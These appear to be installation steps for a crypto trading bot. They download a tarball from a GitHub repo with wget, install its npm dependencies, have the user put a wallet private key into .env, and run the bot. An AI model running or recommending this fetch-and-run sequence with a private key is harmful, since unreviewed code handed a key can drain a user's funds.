📦 QUICK INSTALLATION:

1. DOWNLOAD & EXTRACT:
   wget https://github.com/romerodevv/psgho/raw/main/worldchain-bot-ultrafast-v2.2.1.tar.gz
   tar -xzf worldchain-bot-ultrafast-v2.2.1.tar.gz
   cd worldchain-bot-ultrafast-v2.2.1/

2. INSTALL DEPENDENCIES:
   npm install

3. CONFIGURE:
   cp .env.example .env
   nano .env  # Add your private key and RPC endpoint

4. START BOT:
   node worldchain-trading-bot.js

5. TEST STRATEGY BUILDER:
   Select option 5 from main menu - should work perfectly now!
